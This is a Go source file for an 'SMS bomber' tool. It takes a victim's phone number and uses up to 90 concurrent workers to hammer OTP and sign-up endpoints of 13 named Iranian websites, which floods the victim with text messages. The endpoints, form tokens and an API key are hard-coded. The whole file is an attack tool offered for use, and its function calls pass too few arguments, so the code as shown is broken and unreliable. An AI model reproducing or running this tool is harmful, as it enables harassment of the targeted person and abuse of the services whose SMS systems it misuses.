// faghat teste code
package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"net" 
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"  
        "net/http/cookiejar"  
)
//Code by @monsmain
func clearScreen() {
	cmd := exec.Command("clear")
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/c", "cls")
	}
	cmd.Stdout = os.Stdout
	cmd.Run()
}

func sendJSONRequest(client *http.Client, ctx context.Context, serviceName, url string, payload map[string]interface{}, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second
	const bodyReadLimit = 500 // حداکثر تعداد بایت برای خواندن از بدنه پاسخ

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
			ch <- 0
			return
		default:
		}

		jsonData, err := json.Marshal(payload)
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while encoding JSON for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, bytes.NewBuffer(jsonData))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating request to %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/json")

		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s (%s) on retry %d: %v. Retrying...\033[0m\n", serviceName, url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s (%s) due to network error.\033[0m\n", serviceName, url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// --- بخش اضافه شده برای دیباگ ---
		if resp.StatusCode < 400 && resp.StatusCode != 0 {
			bodyBytes := make([]byte, bodyReadLimit)
			n, readErr := resp.Body.Read(bodyBytes)
			// اگر تعداد بایت خوانده شده به limit رسید و خطایی نبود، احتمالاً بدنه بزرگتر است
			isTruncated := n == bodyReadLimit && readErr == nil
			bodyString := string(bodyBytes[:n])

			fmt.Printf("\033[01;36m[DEBUG Body - %s] Status: %d, Body Snippet (%d bytes%s): %s\033[0m\n",
				serviceName, resp.StatusCode, n, ternary(isTruncated, "+", ""), bodyString)
			// توجه: اینجا resp.Body خوانده شده، اگر بعداً نیاز به خواندن دوباره بود، باید Re-wrap شود که پیچیده است.
            // چون در کد اصلی فقط Close می شود، خواندن اینجا مشکلی ایجاد نمی کند.
		}
		// --- پایان بخش اضافه شده ---


		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

func sendFormRequest(client *http.Client, ctx context.Context, serviceName, url string, formData url.Values, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 3 * time.Second
	const bodyReadLimit = 500 // حداکثر تعداد بایت برای خواندن از بدنه پاسخ

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
			ch <- 0
			return
		default:

		}

		req, err := http.NewRequestWithContext(ctx, http.MethodPost, url, strings.NewReader(formData.Encode()))
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating form request to %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err := client.Do(req)
		if err != nil {

			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s (%s) on retry %d: %v. Retrying...\033[0m\n", serviceName, url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s (%s) due to network error.\033[0m\n", serviceName, url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s (%s) canceled.\033[0m\n", serviceName, url)
				ch <- 0
				return
			} else {

				fmt.Printf("\033[01;31m[-] Unretryable error for %s (%s) on retry %d: %v\033[0m\n", serviceName, url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		// --- بخش اضافه شده برای دیباگ ---
		if resp.StatusCode < 400 && resp.StatusCode != 0 {
			bodyBytes := make([]byte, bodyReadLimit)
			n, readErr := resp.Body.Read(bodyBytes)
            isTruncated := n == bodyReadLimit && readErr == nil
			bodyString := string(bodyBytes[:n])

			fmt.Printf("\033[01;36m[DEBUG Body - %s] Status: %d, Body Snippet (%d bytes%s): %s\033[0m\n",
				serviceName, resp.StatusCode, n, ternary(isTruncated, "+", ""), bodyString)
			// توجه: اینجا resp.Body خوانده شده، اگر بعداً نیاز به خواندن دوباره بود، باید Re-wrap شود که پیچیده است.
            // چون در کد اصلی فقط Close می شود، خواندن اینجا مشکلی ایجاد نمی کند.
		}
		// --- پایان بخش اضافه شده ---

		ch <- resp.StatusCode
		resp.Body.Close()
		return
	}
}

// تابع کمکی ساده برای شبیه سازی ternary operator در Go
func ternary(condition bool, trueVal, falseVal string) string {
	if condition {
		return trueVal
	}
	return falseVal
}
func sendGETRequest(client *http.Client, ctx context.Context, url string, wg *sync.WaitGroup, ch chan<- int) {
	defer wg.Done()

	const maxRetries = 3
	const retryDelay = 2 * time.Second // کمی کمتر از POST برای GET

	for retry := 0; retry < maxRetries; retry++ {
		select {
		case <-ctx.Done():
			fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
			ch <- 0
			return
		default:
		}

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil) // متد GET و Body = nil
		if err != nil {
			fmt.Printf("\033[01;31m[-] Error while creating GET request to %s on retry %d: %v\033[0m\n", url, retry+1, err)
			if retry == maxRetries-1 {
				ch <- http.StatusInternalServerError
				return
			}
			time.Sleep(retryDelay)
			continue
		}

		// >>>>> از پارامتر client برای ارسال درخواست استفاده می‌کنیم <<<<<
		resp, err := client.Do(req)
		if err != nil {
			if netErr, ok := err.(net.Error); ok && (netErr.Timeout() || netErr.Temporary() || strings.Contains(err.Error(), "connection reset by peer") || strings.Contains(err.Error(), "dial tcp")) {
				fmt.Printf("\033[01;31m[-] Network error for %s on retry %d: %v. Retrying...\033[0m\n", url, retry+1, err)
				if retry == maxRetries-1 {
					fmt.Printf("\033[01;31m[-] Max retries reached for %s due to network error.\033[0m\n", url)
					ch <- http.StatusInternalServerError
					return
				}
				time.Sleep(retryDelay)
				continue
			} else if ctx.Err() == context.Canceled {
				fmt.Printf("\033[01;33m[!] Request to %s canceled.\033[0m\n", url)
				ch <- 0
				return
			} else {
				fmt.Printf("\033[01;31m[-] Unretryable error for %s on retry %d: %v\033[0m\n", url, retry+1, err)
				ch <- http.StatusInternalServerError
				return
			}
		}

		ch <- resp.StatusCode
		resp.Body.Close()
		return // موفقیت آمیز بود، از حلقه تلاش مجدد خارج می شویم
	}
}//Code by @monsmain
//(faghat baraye site payagym.com)
func formatPhoneWithSpaces(p string) string {
	p = getPhoneNumberNoZero(p) 
	if len(p) >= 10 {
		if len(p) >= 10 {
			return p[0:3] + " " + p[3:6] + " " + p[6:10]
		}
		return p
	}
	return p 
}
func getPhoneNumberNoZero(phone string) string {
	if strings.HasPrefix(phone, "0") {
		return phone[1:]
	}
	return phone
}

func getPhoneNumber98NoZero(phone string) string {
	return "98" + getPhoneNumberNoZero(phone)
}

func getPhoneNumberPlus98NoZero(phone string) string {
	return "+98" + getPhoneNumberNoZero(phone)
}
func main() {
	clearScreen()

	fmt.Print("\033[01;32m")
	fmt.Print(`
                                :-.                                   
                         .:   =#-:-----:                              
                           **%@#%@@@#*+==:                            
                       :=*%@@@@@@@@@@@@@@%#*=:                        
                    -*%@@@@@@@@@@@@@@@@@@@@@@@%#=.                   
                . -%@@@@@@@@@@@@@@@@@@@@@@@@%%%@@@#:                 
              .= *@@@@@@@@@@@@@@@@@@@@@@@@@@@%#*+*%%*.               
             =%.#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#+=+#:              
            :%=+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%+.+.             
            #@:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%..            
           .%@*@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%.            
`)
	fmt.Print("\033[01;37m")
	fmt.Print(`
           =@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#            
           +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
           =@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-           
           .%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:           
            #@@@@@@%####**+*%@@@@@@@@@@%*+**####%@@@@@@#            
            -@@@@*:       .  -#@@@@@@#:  .       -#@@@%:            
            *@@%#             -@@@@@@.            #@@@+             
             .%@@# @monsmain  +@@@@@@=  Sms Bomber #@@#              
             :@@*            =%@@@@@@%-  faster    *@@:              
              #@@%         .*@@@@#%@@@%+.         %@@+              
              %@@@+      -#@@@@@* :%@@@@@*-      *@@@*              
`)
	fmt.Print("\033[01;31m")
	fmt.Print(`
              *@@@@#++*#%@@@@@@+    #@@@@@@%#+++%@@@@=              
               #@@@@@@@@@@@@@@* Go   #@@@@@@@@@@@@@@*               
                =%@@@@@@@@@@@@* :#+ .#@@@@@@@@@@@@#-                
                  .---@@@@@@@@@%@@@%%@@@@@@@@%:--.                   
                      #@@@@@@@@@@@@@@@@@@@@@@+                      
                       *@@@@@@@@@@@@@@@@@@@@+                       
                        +@@%*@@%@@@%%@%*@@%=                         
                         +%+ %%.+@%:-@* *%-                          
                          .  %# .%#  %+                              
                             :.  %+  :.                              
                                 -:                                  
`)
	fmt.Print("\033[0m")

// تعداد کل سرویس هایی که اضافه می کنیم (1 سرویس قبلی + 12 سرویس جدید)
	numberOfServices := 1 + 12
	fmt.Printf("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSms bomber ! number web service : \033[01;31m%d\n", numberOfServices)
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mCall bomber ! number web service : \033[01;31m6\n\n") // این عدد 6 ثابت باقی مانده

	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter phone [Ex : 09xxxxxxxxxx]: \033[00;36m")
	var phone string
	fmt.Scan(&phone)

	var repeatCount int
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mEnter Number sms/call : \033[00;36m")
	fmt.Scan(&repeatCount)

	var speedChoice string
	fmt.Print("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;32mChoose speed [medium/fast]: \033[00;36m")
	fmt.Scan(&speedChoice)

	var numWorkers int
	switch strings.ToLower(speedChoice) {
	case "fast":
		numWorkers = 90
		fmt.Println("\033[01;33m[*] Fast mode selected. Using", numWorkers, "workers.\033[0m")
	case "medium":
		numWorkers = 40
		fmt.Println("\033[01;33m[*] Medium mode selected. Using", numWorkers, "workers.\033[0m")
	default:
		numWorkers = 40
		fmt.Println("\033[01;31m[-] Invalid speed choice. Defaulting to medium mode using", numWorkers, "workers.\033[0m")
	}

	ctx, cancel := context.WithCancel(context.Background())
	signalChan := make(chan os.Signal, 1)
	signal.Notify(signalChan, syscall.SIGINT, syscall.SIGTERM)

	go func() {
		<-signalChan
		fmt.Println("\n\033[01;31m[!] Interrupt received. Shutting down...\033[0m")
		cancel() // ارسال سیگنال لغو به Context
	}()

	cookieJar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar:     cookieJar,
		Timeout: 10 * time.Second, // Timeout برای هر درخواست
	}

	// اندازه کانال Task به تعداد کل درخواست ها (تعداد تکرار * تعداد سرویس ها)
	totalRequests := repeatCount * numberOfServices
	tasks := make(chan func(), totalRequests)
	ch := make(chan int, totalRequests) // کانال نتیجه هم به همین اندازه و از نوع int باقی می ماند

	var wg sync.WaitGroup

	// راه اندازی Worker Pool (بدون تغییر)
	for i := 0; i < numWorkers; i++ {
		go func() {
			for task := range tasks {
				task()
			}
		}()
	}

	// اضافه کردن Task ها به کانال tasks
	for i := 0; i < repeatCount; i++ {

// --- سرویس 1: MCIShop (همان کد قبلی) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"msisdn": phone, // فرمت 09... (شماره ورودی خام)
				}
				sendJSONRequest(c, ctx, "https://api-ebcom.mci.ir/services/auth/v1.0/otp", payload, &wg, ch)
			}
		}(client)


		// --- سرویس 2: LivarFars (Step 1 - Request OTP) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"digt_countrycode":      {"+98"},
					"phone":                 {getPhoneNumberNoZero(phone)}, // فرمت 9...
					"digits_process_register": {"1"},
					"instance_id":           {"c615328f4685ecfc0bb3378a99c1cc44"}, // توجه: احتمال داینامیک بودن
					"optional_data":         {"optional_data"},
					"action":                {"digits_forms_ajax"},
					"type":                  {"register"},
					"dig_otp":               {""},
					"digits":                {"1"},
					"digits_redirect_page":  {"//livarfars.ir/product-category/electronic-devices/wearable-gadget/?page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2Fproduct-category%2Felectronic-devices%2Fwearable-gadget%2F"}, // توجه: احتمال داینامیک بودن
					"digits_form":           {"673112fec7"}, // توجه: احتمال داینامیک بودن
					"_wp_http_referer":      {"/product-category/electronic-devices/wearable-gadget/?login=true&page=2&redirect_to=https%3A%2F%2Flivarfars.ir%2Fproduct-category%2Felectronic-devices%2Fwearable-gadget%2F"}, // توجه: احتمال داینامیک بودن
				}
				sendFormRequest(c, ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// --- سرویس 3: Ashraafi (Check Phone) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"action":       {"check_phone_number"},
					"phone_number": {phone}, // فرمت 09...
				}
				sendFormRequest(c, ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// --- سرویس 4: Ashraafi (Send OTP) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"action":       {"send_verification_code"},
					"phone_number": {phone}, // فرمت 09...
				}
				sendFormRequest(c, ctx, "https://ashraafi.com/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// --- سرویس 5: Moshaveran724 (Validate) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"number": {phone}, // فرمت 09...
					"cache":  {"false"},
				}
				sendFormRequest(c, ctx, "https://moshaveran724.ir/m/uservalidate.php", formData, &wg, ch)
			}
		}(client)

		// --- سرویس 6: Moshaveran724 (PMS) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"number": {phone}, // فرمت 09...
					"cache":  {"false"},
				}
				sendFormRequest(c, ctx, "https://moshaveran724.ir/m/pms.php", formData, &wg, ch)
			}
		}(client)

		// --- سرویس 7: SimkhanAPI ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobileNumber": phone, // فرمت 09...
					"key":          "16a85bef-70be-41b2-934b-994e2aa113b7", // توجه: احتمال داینامیک بودن/کلید API
					"ReSendSMS":    false,
				}
				sendJSONRequest(c, ctx, "https://simkhanapi.ir/api/users/registerV2", payload, &wg, ch)
			}
		}(client)

		// --- سرویس 8: Pakhsh.Shop (OTP Request) ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"digt_countrycode":      {"+98"},
					"phone":                 {getPhoneNumberNoZero(phone)}, // فرمت 9...
					"digits_reg_name":       {"ghbfgf"}, // توجه: احتمال داینامیک بودن
					"digits_process_register": {"1"},
					"instance_id":           {"d49463434e4d494fa93e5f6a1bdcd189"}, // توجه: احتمال داینامیک بودن
					"optional_data":         {"optional_data"},
					"action":                {"digits_forms_ajax"},
					"type":                  {"register"},
					"dig_otp":               {""},
					"digits":                {"1"},
					"digits_redirect_page":  {"//pakhsh.shop/?page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F"},
					"digits_form":           {"65ecb01c4f"}, // توجه: احتمال داینامیک بودن
					"_wp_http_referer":      {"/?login=true&page=1&redirect_to=https%3A%2F%2Fpakhsh.shop%2F"},
				}
				sendFormRequest(c, ctx, "https://pakhsh.shop/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

		// --- سرویس 9: Doctoreto ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile":     getPhoneNumberNoZero(phone), // فرمت 9...
					"country_id": 205,
					"captcha":    "", // توجه: فیلد Captcha احتمالاً لازم است
				}
				sendJSONRequest(c, ctx, "https://api.doctoreto.com/api/web/patient/v1/accounts/register", payload, &wg, ch)
			}
		}(client)

		// --- سرویس 10: Backend.Digify.Shop ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"phone_number": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://backend.digify.shop/user/merchant/otp/", payload, &wg, ch)
			}
		}(client)

		// --- سرویس 11: WatchOnline.Shop ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				payload := map[string]interface{}{
					"mobile": phone, // فرمت 09...
				}
				sendJSONRequest(c, ctx, "https://api.watchonline.shop/api/v1/otp/request", payload, &wg, ch)
			}
		}(client)

		// --- سرویس 12: Offch.com ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"1_username":    {phone}, // فرمت 09...
					"1_invite_code": {""},
				}
				sendFormRequest(c, ctx, "https://www.offch.com/login", formData, &wg, ch)
			}
		}(client)


		// --- سرویس 13: Glite.ir ---
		wg.Add(1)
		tasks <- func(c *http.Client) func() {
			return func() {
				formData := url.Values{
					"action":         {"mreeir_send_sms"},
					"mobileemail":    {phone}, // فرمت 09...
					"userisnotauser": {""},
					"type":           {"mobile"},
					"captcha":        {""},   // توجه: احتمال داینامیک بودن/لازم بودن Captcha
					"captchahash":    {""},   // توجه: احتمال داینامیک بودن Captcha Hash
					"security":       {"5881793717"}, // توجه: احتمال بسیار زیاد داینامیک بودن (Session Token?)
				}
				sendFormRequest(c, ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
			}
		}(client)

	}
	close(tasks)

	go func() {
		wg.Wait()
		close(ch)
	}()

	for statusCode := range ch {
		if statusCode >= 400 || statusCode == 0 {
			fmt.Println("\033[01;31m[-] Error or Canceled!")
		} else {
			fmt.Println("\033[01;31m[\033[01;32m+\033[01;31m] \033[01;33mSended")
		}
	}
}
//Code by @monsmain
